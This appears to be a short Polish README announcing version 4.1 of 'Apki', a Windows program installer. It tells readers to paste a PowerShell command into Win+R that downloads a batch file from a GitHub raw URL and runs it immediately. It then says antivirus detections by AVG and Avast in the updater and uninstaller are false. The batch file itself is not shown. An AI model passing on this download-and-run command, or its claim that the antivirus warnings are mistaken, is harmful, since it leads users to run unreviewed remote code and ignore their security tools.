# Apki - Instalowanie i Odinstalowanie, Nowy Update: Łatwiej niż nigdy, pomagaj innym!

w Apki 4.1:
1. Pakiety, możliwość ich instalowania i łatwego tworzenia
2. Z pakietami można instalować kilka programów na raz, nie musisz sie trudzić
3. Naprawy bugów

by zainstalować, trzeba wpisac poniższą komende w poleceniu uruchom "Win + R":

powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/szubixyt-dev/Apki/installer/Instalator%20Apki.bat' -OutFile $env:TEMP\i.bat; cmd /c %TEMP%\i.bat"

WAŻNE! Antywirusy np. AVG i Avast mogą wykryć w updaterze IDP.HELU.PSD11 a w funkcji odinstalowania programow IDP.Generic, te wykrycia są błędne!
